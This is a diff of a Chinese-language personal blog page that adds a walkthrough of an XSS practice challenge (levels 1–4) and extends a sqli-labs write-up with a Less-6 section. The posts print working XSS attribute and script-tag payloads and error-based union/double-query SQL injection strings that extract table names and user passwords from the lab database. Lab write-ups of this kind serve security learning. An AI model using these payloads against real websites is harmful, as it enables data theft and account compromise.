@@ -84,6 +84,61 @@ ga('send', 'pageview');
       <div class="outer">
         <section id="main">
   
+    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/03/02/xss/" class="article-date">
+  <time datetime="2019-03-01T22:22:42.000Z" itemprop="datePublished">2019-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/03/02/xss/">XSS 20关挑战</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p>
+<p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p>
+<p>查看源码<code>window.alert = function()</code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p>
+<p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p>
+<hr>
+<h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p>
+<p><a href="https://imgchr.com/i/kqT7Ed" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p>
+<hr>
+<h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p>
+<p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p>
+<hr>
+<h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p>
+<hr>
+<p>更新于2019-03-03 11:19:50 星期日</p>
+
+      
+    </div>
+    <footer class="article-footer">
+    <span id="busuanzi_container_page_pv">
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+      <a data-url="http://finsenty54.github.io/2019/03/02/xss/" data-id="cjssdnagk0002lsw86ekxeyau" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xss/">xss</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sqli-labs" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2019/02/27/sqli-labs/" class="article-date">
@@ -106,7 +161,7 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><blockquote>
+        <h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><blockquote>
 <p>single 单个的<br>quote 引号<br>变量前面加 <strong>?</strong><br>information_schema.tables<br>information_schema.columns<br>information_schema.schemata</p>
 </blockquote>
 <p>在Less-1里的index.php中添加 <code>echo $sql;</code> 可在网页中显示查询代码，<code>echo &quot;&lt;br&gt;&quot;;</code> 表示换行</p>
@@ -132,15 +187,18 @@ ga('send', 'pageview');
 </li>
 </ol>
 <hr>
-<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><ul>
+<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul>
 <li><code>?id=1&#39;</code>报错</li>
 <li><code>?id=1 and 1=1</code>正确</li>
 <li><code>?id=1 and 1=2</code>错误<br>可知是数字型注入<br><em>解题与第一题类似，不再赘述</em></li>
 </ul>
-<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p>
+<hr>
+<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>查看源码可知，用<code>()</code>加在了id两边，所以只要将<code>()</code>闭合就行了<br><code>?id=-1&#39;) union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),3--+</code><br><code>?id=-1&#39;) union select 1,(select group_concat(password) from users),3--+</code></p>
 <p><a href="https://imgchr.com/i/kHbj8P" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kHbj8P.png" alt="kHbj8P.png"></a></p>
-<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>查看源码，id两边加了”,用<code>?id=-1&quot;)</code>闭合</p>
-<h3 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h3><p><strong><em>双注入</em></strong></p>
+<hr>
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>查看源码，id两边加了”,用<code>?id=-1&quot;)</code>闭合</p>
+<hr>
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p><strong><em>双注入</em></strong></p>
 <ol>
 <li>Rand() //随机函数</li>
 <li>Floor() //取整函数</li>
@@ -150,8 +208,14 @@ ga('send', 'pageview');
 <p><a href="https://blog.csdn.net/Leep0rt/article/details/78556440" target="_blank" rel="noopener">https://blog.csdn.net/Leep0rt/article/details/78556440</a></p>
 <p><code>?id=1&#39; union select count(*),1,concat((select database()), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbMSh9" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbMSh9.png" alt="kbMSh9.png"></a><br>select 查询列数要相同，否则报错</p>
 <p><code>?id=1&#39; union select count(*),1,concat((select password from users limit 5,1), &#39;_&#39;,floor(rand()*2)) as a from information_schema.columns group by a--+</code><br><a href="https://imgchr.com/i/kbQiCj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/01/kbQiCj.png" alt="kbQiCj.png"></a><br>用<code>group_concat</code>会报错，使用<code>limit</code></p>
-<hr>
 <p>更新于2019-03-01 22:21:15 星期五</p>
+<hr>
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>尝试注入后可知是用<code>&quot;</code>闭合，字符串型<br>其他和上题一致<br><code>?id=1&quot;  union select count(*),concat( (select user()),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
+<p><a href="https://imgchr.com/i/kLirA1" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kLirA1.png" alt="kLirA1.png"></a></p>
+<p><code>?id=1&quot;  union select count(*),concat( (select table_name from information_schema.tables where table_schema=database() limit 3,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
+<p><code>?id=1&quot;  union select count(*),concat( (select column_name from information_schema.columns where table_name=&quot;users&quot; limit 5,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
+<p><code>?id=1&quot;  union select count(*),concat( (select password from users limit 0,1 ),&#39;_&#39;,floor(rand()*2) ) as a,3 from information_schema.schemata group by a --+</code></p>
+<p>更新于2019-03-03 11:48:51 星期日</p>
 <hr>
 
       
@@ -160,7 +224,7 @@ ga('send', 'pageview');
     <span id="busuanzi_container_page_pv">
   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
 	</span>
-      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjsq5cguz0001q8w8v6bcwvxn" class="article-share-link">Share</a>
+      <a data-url="http://finsenty54.github.io/2019/02/27/sqli-labs/" data-id="cjssdnage0001lsw8ceh0oku0" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul>
@@ -185,7 +249,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -195,7 +259,7 @@ ga('send', 'pageview');
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -206,6 +270,10 @@ ga('send', 'pageview');
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2019/03/02/xss/">XSS 20关挑战</a>
+          </li>
         
           <li>
             <a href="/2019/02/27/sqli-labs/">sqli-labs</a>
